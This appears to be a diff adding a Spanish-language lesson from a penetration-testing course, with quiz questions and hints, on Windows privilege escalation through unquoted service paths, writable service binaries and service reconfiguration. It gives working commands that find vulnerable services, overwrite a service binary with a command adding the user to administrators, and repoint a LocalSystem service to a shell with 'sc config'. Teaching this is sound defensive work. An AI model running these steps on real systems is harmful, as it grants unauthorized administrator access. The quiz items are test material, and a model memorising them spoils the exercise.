@@ -1,0 +1,75 @@
+---
+index: 2
+title: "Servicios: unquoted paths y binarios escribibles"
+questions:
+  - id: privesc-windows-t02-q01
+    prompt: "Un servicio corre: C:\\Program Files\\A\\B\\service.exe (SIN comillas). ¿Por qué es peligroso?"
+    hint: "Windows resuelve espacios ambiguos probando rutas: C:\\Program.exe primero."
+    kind: text
+  - id: privesc-windows-t02-q02
+    prompt: "El servicio 'CustomSvc' corre como LocalSystem y su binario C:\\services\\custom.exe es escribible por todos. ¿Cómo escalas?"
+    hint: "Sustituye el binario por una shell y reinicia el servicio."
+    kind: text
+  - id: privesc-windows-t02-q03
+    prompt: "¿Qué comando reinicia un servicio de Windows desde cmd?"
+    hint: "sc stop / sc start, o net stop / net start"
+    kind: text
+---
+
+## Unquoted Service Paths: el clásico que nunca muere
+
+Cuando un servicio tiene una ruta CON ESPACIOS y SIN COMILLAS:
+
+```text
+C:\Program Files\A\B\service.exe
+```
+
+Windows la resuelve probando en este orden:
+
+```text
+C:\Program.exe          ← ¿existe? si sí, ¡ejecuta ESTE!
+C:\Program Files\A.exe  ← ¿existe?
+C:\Program Files\A\B.exe
+C:\Program Files\A\B\service.exe  ← el real
+```
+
+Si `C:\` es escribible → coloca tu `Program.exe` (una shell o un comando que añada
+tu usuario a administradores) → reinicia → el servicio ejecuta TU binario como
+LocalSystem.
+
+```cmd
+:: Buscar servicios con rutas sin comillas
+wmic service get name,pathname | findstr /i "LocalSystem" | findstr /v /i "C:\Windows"
+```
+
+## Binarios de servicio escribibles
+
+Más directo: si el binario del servicio es escribible por tu usuario:
+
+```cmd
+:: 1. Genera tu payload (msfvenom o adduser.bat)
+echo net localgroup administrators tu_usuario /add > C:\services\custom.exe
+:: (en la práctica: un binario real que añada tu usuario)
+
+:: 2. Reinicia el servicio
+sc stop CustomSvc
+sc start CustomSvc
+
+:: 3. El servicio ejecuta tu comando como LocalSystem
+```
+
+## Service SID y permisos
+
+```cmd
+:: ¿Quién puede modificar el servicio?
+sc sdshow CustomSvc       :: muestra el descriptor de seguridad
+accesschk.exe -wcvu CustomSvc   :: (Sysinternals) muestra WRITE permissions
+```
+
+Si tu usuario tiene `SERVICE_CHANGE_CONFIG` sobre un servicio que corre como
+LocalSystem → puedes cambiar el binario que ejecuta:
+
+```cmd
+sc config CustomSvc binpath= "C:\temp\shell.exe"
+sc stop CustomSvc && sc start CustomSvc
+```
